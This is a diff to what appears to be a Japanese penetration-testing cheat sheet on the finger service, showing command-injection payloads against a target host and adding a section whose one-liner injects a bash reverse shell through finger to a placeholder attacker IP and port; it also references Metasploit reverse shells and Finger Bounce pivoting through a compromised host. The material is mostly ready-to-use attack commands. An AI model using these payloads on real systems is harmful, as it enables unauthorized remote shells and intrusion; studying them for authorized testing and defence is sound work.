@@ -63,6 +63,10 @@ finger "|/bin/id@<TargetIP>"
 finger "|/bin/ls -a /@<TargetIP>"
 ```
 
+リバースシェル
+```sh
+finger "|/bin/bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1@<TargetIP>"
+```
 ### Metasploit でリバースシェル
 
 ```zsh
@@ -77,6 +81,7 @@ exploit
 ## Finger Bounce（ピボット）
 
 中間の侵害済みホストを経由して、ファイアウォール内部のマシンへFingerクエリをリレーする手法。
+
 
 ```zsh
 # 中間ホスト経由でクエリをリレー
